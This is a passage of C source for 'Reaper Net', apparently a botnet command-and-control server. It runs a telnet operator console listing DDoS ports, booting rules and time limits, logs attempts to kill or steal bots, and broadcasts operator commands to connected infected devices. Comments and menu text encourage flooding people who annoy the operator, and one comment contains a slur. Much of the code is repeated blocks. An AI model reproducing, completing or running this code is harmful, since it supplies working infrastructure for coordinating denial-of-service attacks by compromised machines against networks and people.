                if(send(thefd, ddosline2,  strlen(ddosline2),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, ddosline3,  strlen(ddosline3),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, ddosline4,  strlen(ddosline4),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, ddosline5,  strlen(ddosline5),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, ddosline6,  strlen(ddosline6),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, ddosline7,  strlen(ddosline7),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, ddosline8,  strlen(ddosline8),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, ddosline9,  strlen(ddosline9),   MSG_NOSIGNAL) == -1) goto end;
                pthread_create(&title, NULL, &titleWriter, sock);
                while(1) {
                if(send(thefd, "\x1b[1;37m[root@Reaper ~]#", 24, MSG_NOSIGNAL) == -1) goto end;
                break;
                }
                continue;
            }
            if(strstr(buf, "PORTS")) {
                pthread_create(&title, NULL, &titleWriter, sock);
                char portline1  [5000];
                char portline2  [5000];
                char portline3  [5000];
                char portline4  [5000];
                char portline5  [5000];
                char portline6  [5000];
                char portline7  [5000];
                char portline8  [5000];
                char portline9  [5000];
                
                sprintf(portline1,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]PORTS\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]\r\n");
                sprintf(portline2,  "\x1b[0;31m22\r\n");
                sprintf(portline3,  "\x1b[0;31m  23\r\n");
                sprintf(portline4,  "\x1b[0;31m    53\r\n");
                sprintf(portline5,  "\x1b[0;31m      80\r\n");
                sprintf(portline6,  "\x1b[0;31m        443\r\n");
                sprintf(portline7,  "\x1b[0;31m           1723\r\n");
                sprintf(portline8,  "\x1b[0;31m               3074\r\n");
                sprintf(portline9,  "\x1b[0;31m                   8080\r\n");

                if(send(thefd, portline1,  strlen(portline1),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, portline2,  strlen(portline2),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, portline3,  strlen(portline3),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, portline4,  strlen(portline4),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, portline5,  strlen(portline5),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, portline6,  strlen(portline6),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, portline7,  strlen(portline7),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, portline8,  strlen(portline8),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, portline9,  strlen(portline9),   MSG_NOSIGNAL) == -1) goto end;
                pthread_create(&title, NULL, &titleWriter, sock);
                while(1) {
                if(send(thefd, "\x1b[1;37m[root@Reaper ~]#", 24, MSG_NOSIGNAL) == -1) goto end;
                break;
                }
                continue;
            }
            if(strstr(buf, "RULES")) {
                pthread_create(&title, NULL, &titleWriter, sock);
                char MOREline1  [5000];
                char MOREline2  [5000];
                char MOREline3  [5000];
                char MOREline4  [5000];
                char MOREline5  [5000];

                sprintf(MOREline1,  "\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]RULES\x1b[1;37m[\x1b[0;31m+\x1b[1;37m]\r\n");
                sprintf(MOREline2,  "\x1b[1;37m- \x1b[1;32mNo Rapid Booting\r\n");
                sprintf(MOREline3,  "\x1b[1;37m- \x1b[1;33mNo Sharing Users\r\n");
                sprintf(MOREline4,  "\x1b[1;37m- \x1b[0;34mNo Going Over Time\r\n");
                sprintf(MOREline5,  "\x1b[1;37m- \x1b[0;35mNo Using Scanner Commands\r\n");
                
                if(send(thefd, MOREline1,  strlen(MOREline1),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, MOREline2,  strlen(MOREline2),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, MOREline3,  strlen(MOREline3),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, MOREline4,  strlen(MOREline4),   MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, MOREline5,  strlen(MOREline5),   MSG_NOSIGNAL) == -1) goto end;
                pthread_create(&title, NULL, &titleWriter, sock);
                while(1) {
                if(send(thefd, "\x1b[1;37m[root@Reaper ~]#", 24, MSG_NOSIGNAL) == -1) goto end;
                break;
                }
                continue;
            }
        if(strstr(buf, "CLEAR")){

        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line7 , strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line8 , strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line9 , strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line10 , strlen(ascii_banner_line10), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line11 , strlen(ascii_banner_line11), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line12 , strlen(ascii_banner_line12), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line13 , strlen(ascii_banner_line13), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line14 , strlen(ascii_banner_line14), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line15 , strlen(ascii_banner_line15), MSG_NOSIGNAL) == -1) goto end;    
        if(send(thefd, ascii_banner_line16 , strlen(ascii_banner_line16), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line17 , strlen(ascii_banner_line17), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line18 , strlen(ascii_banner_line18), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line19 , strlen(ascii_banner_line19), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line20 , strlen(ascii_banner_line20), MSG_NOSIGNAL) == -1) goto end;    
        if(send(thefd, ascii_banner_line21 , strlen(ascii_banner_line21), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line22 , strlen(ascii_banner_line22), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line23 , strlen(ascii_banner_line23), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, line1, strlen(line1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, line2, strlen(line2), MSG_NOSIGNAL) == -1) goto end;
        managements[thefd].connected = 1;
        }
        if(strstr(buf, "clear")){
        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line7 , strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line8 , strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line9 , strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line10 , strlen(ascii_banner_line10), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line11 , strlen(ascii_banner_line11), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line12 , strlen(ascii_banner_line12), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line13 , strlen(ascii_banner_line13), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line14 , strlen(ascii_banner_line14), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line15 , strlen(ascii_banner_line15), MSG_NOSIGNAL) == -1) goto end;    
        if(send(thefd, ascii_banner_line16 , strlen(ascii_banner_line16), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line17 , strlen(ascii_banner_line17), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line18 , strlen(ascii_banner_line18), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line19 , strlen(ascii_banner_line19), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line20 , strlen(ascii_banner_line20), MSG_NOSIGNAL) == -1) goto end;    
        if(send(thefd, ascii_banner_line21 , strlen(ascii_banner_line21), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line22 , strlen(ascii_banner_line22), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line23 , strlen(ascii_banner_line23), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, line1, strlen(line1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, line2, strlen(line2), MSG_NOSIGNAL) == -1) goto end;
        managements[thefd].connected = 1;
        }

        if(strstr(buf, "EXTRA")){
           
        char EXTRA1 [5000];
        char EXTRA2 [5000];
        char EXTRA3 [5000];
        char EXTRA4 [5000];
    
        sprintf(EXTRA1, "\x1b[0;31mTHIS IS FOR THE SKIDZZ\r\n");
        sprintf(EXTRA2, "\x1b[0;31mMAX TIME=1000\r\n");
        sprintf(EXTRA3, "\x1b[0;31mTHAT DONT MEAN SPAM 1000\r\n");
        sprintf(EXTRA4, "\x1b[0;31mIF SOMEONE IS PISSING YOU OFF JUST DO 100-600 SECONDS\r\n");

        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, EXTRA1, strlen(EXTRA1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, EXTRA2, strlen(EXTRA2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, EXTRA3, strlen(EXTRA3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, EXTRA4, strlen(EXTRA4), MSG_NOSIGNAL) == -1) goto end;
        while(1) {
        if(send(thefd, "\x1b[1;37m[root@Reaper ~]#", 24, MSG_NOSIGNAL) == -1) goto end;
        break;
        }
        pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
        continue;
        }
        if(strstr(buf, "LOGOUT")) 
        {  
          sprintf(botnet, "Thank you for using the reaper! %s Cya Next Time\r\n", accounts[find_line].id, buf);
          if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
          goto end;
        } // No fuckin time limit nigga we fuckin shit up !!!!!!  :)
        if(strstr(buf, "99999999999")) 
        {  
        printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
        goto end;
        } // max time
        if(strstr(buf, "99999999999")) 
        {  
        printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
        goto end;
        } // max time
        if(strstr(buf, "99999999999")) 
        {  
        printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
        goto end;
        } // max time
        if(strstr(buf, "99999999999")) 
        {  
        printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
        goto end;
        } // max time
        if(strstr(buf, "99999999999")) 
        {  
        printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
        goto end;
        } // max time
        if(strstr(buf, "99999999999")) 
        {  
        printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
        goto end;
        } // max time
        if(strstr(buf, "99999999999")) 
        {  
        printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
        goto end;
        } // max time
        if(strstr(buf, "99999999999")) 
        {  
        printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
        goto end;
        } // max time
        if(strstr(buf, "99999999999")) 
        {  
        printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
        goto end;
        } // max time
        if(strstr(buf, "99999999999")) 
        {  
        printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
        goto end;
        }
        if(strstr(buf, "99999999999")) 
        {  
        printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
        goto end;
        } // max time
        if(strstr(buf, "99999999999")) 
        {  
        printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
        goto end;
        } // max time
        if(strstr(buf, "99999999999")) 
        {  
        printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
        goto end;
        } // max time
        if(strstr(buf, "99999999999")) 
        {  
        printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
        goto end;
        } // max time
        if(strstr(buf, "99999999999")) 
        {  
        printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
        goto end;
        }
        if(strstr(buf, "LOLNOGTFO")) 
        {  
        printf("ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
        FILE *logFile;
        logFile = fopen("KILL.log", "a");
        fprintf(logFile, "ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
        goto end;
        }
        if(strstr(buf, "GTFOFAG")) 
        {  
        printf("ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
        FILE *logFile;
        logFile = fopen("KILL.log", "a");
        fprintf(logFile, "ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
        goto end;
        }//if you dont like this just take out common sense 
        if(strstr(buf, "DUP")) 
        {  
        printf("ATTEMPT TO KILL YOUR BOTS BY %s\n", accounts[find_line].id, buf);
        FILE *logFile;
        logFile = fopen("BOTKILLER.log", "a");
        fprintf(logFile, "ATTEMPT TO STEAL BOTS %s\n", accounts[find_line].id, buf);
        fclose(logFile);
        goto end;
        }
        if(strstr(buf, "dup")) 
        {  
        printf("ATTEMPT TO KILL YOUR BOTS BY %s\n", accounts[find_line].id, buf);
        FILE *logFile;
        logFile = fopen("SMALLBOTKILLER.log", "a");
        fprintf(logFile, "ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
        goto end;
                }
                trim(buf);
                if(send(thefd, "\x1b[1;37m[root@Reaper ~]#", 24, MSG_NOSIGNAL) == -1) goto end;
                if(strlen(buf) == 0) continue;
                printf("%s: \"%s\"\n",accounts[find_line].id, buf);
                FILE *logFile;
                logFile = fopen("report.log", "a");
                fprintf(logFile, "%s: \"%s\"\n",accounts[find_line].id, buf);
                fclose(logFile);
                broadcast(buf, thefd, usernamez);
                memset(buf, 0, 2048);
        }
 
        end:    // cleanup dead socket
                managements[thefd].connected = 0;
                close(thefd);
                managesConnected--;
}
void *telnetListener(int port)
{
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)
        {
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}
 
int main (int argc, char *argv[], void *sock)
{
        signal(SIGPIPE, SIG_IGN); // ignore broken pipe errors sent from kernel
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4)
        {
                fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
                exit (EXIT_FAILURE);
        }
        port = atoi(argv[3]);
        printf("\x1b[32mReaper Net ,\x1b[33m Remade, \n");
        printf("\x1b[1;35mBY @FLEXINGONLAMERS \x1b[0;31mReaper \x1b[35mNet \x1b[36mSreened\x1b[0m\n");
        telFD = fopen("bots.txt", "a+");
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]); // try to create a listening socket, die if we can't
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD); // try to make it nonblocking, die if we can't
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN); // listen with a huuuuge backlog, die if we can't
        if (s == -1)
        {
                perror ("listen");
                abort ();
        }
        epollFD = epoll_create1 (0); // make an epoll listener, die if we can't
        if (epollFD == -1)
        {
                perror ("epoll_create");
                abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
                perror ("epoll_ctl");
                abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--)
        {
                pthread_create( &thread[threads + 2], NULL, &epollEventLoop, (void *) NULL); // make a thread to command each bot individually
        }
        pthread_create(&thread[0], NULL, &telnetListener, port);
        while(1)
        {
                broadcast("PING", -1, "PURGE");
                sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}
